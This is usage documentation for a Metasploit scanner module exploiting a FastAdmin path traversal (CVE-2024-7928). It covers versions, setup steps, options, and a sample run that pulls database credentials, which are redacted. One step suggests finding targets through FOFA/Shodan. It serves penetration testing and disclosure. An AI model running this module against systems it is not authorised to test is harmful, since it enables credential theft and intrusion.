## Vulnerable Application

This module exploits a path traversal vulnerability in FastAdmin versions up to `1.3.3.20220121`, specifically within the `/index/ajax/lang` endpoint.
By manipulating the `lang` parameter, unauthenticated remote attackers can access arbitrary files on the server, such as configuration files containing sensitive credentials.
The vulnerability (CVE-2024-7928) has been publicly disclosed and is fixed in version `1.3.4.20220530`.

- Affected version: <= 1.3.3.20220121
- Fixed version: 1.3.4.20220530
- CVE: [CVE-2024-7928](https://nvd.nist.gov/vuln/detail/CVE-2024-7928)
- Advisory: https://s4e.io/tools/fastadmin-path-traversal-cve-2024-7928

## Verification Steps

1. Install the vulnerable version of FastAdmin or find targets using FOFA/Shodan.
2. Start `msfconsole`
3. Run: `use auxiliary/scanner/http/fastadmin_path_traversal_cve_2024_7928`
4. Set `RHOSTS`
5. Run the module with `run`
6. On success, database credentials should be printed to the console

## Options

```
msf6 auxiliary(scanner/http/fastadmin_path_traversal_cve_2024_7928) > show options

Module options (auxiliary/scanner/http/fastadmin_path_traversal_cve_2024_7928):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.0.2.10       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to FastAdmin instance
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host
```

## Scenarios

### FastAdmin 1.3.3.20220121 deployed with default configuration

```
msf6 > use auxiliary/scanner/http/fastadmin_path_traversal_cve_2024_7928
msf6 auxiliary(scanner/http/fastadmin_path_traversal_cve_2024_7928) > set RHOSTS 192.0.2.10
rhosts => 192.0.2.10
msf6 auxiliary(scanner/http/fastadmin_path_traversal_cve_2024_7928) > run

[+] 192.0.2.10 is vulnerable!
[+] DB Type   : mysql
[+] Hostname  : <redacted>
[+] Database  : fastadmin
[+] Username  : root
[+] Password  : <redacted>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


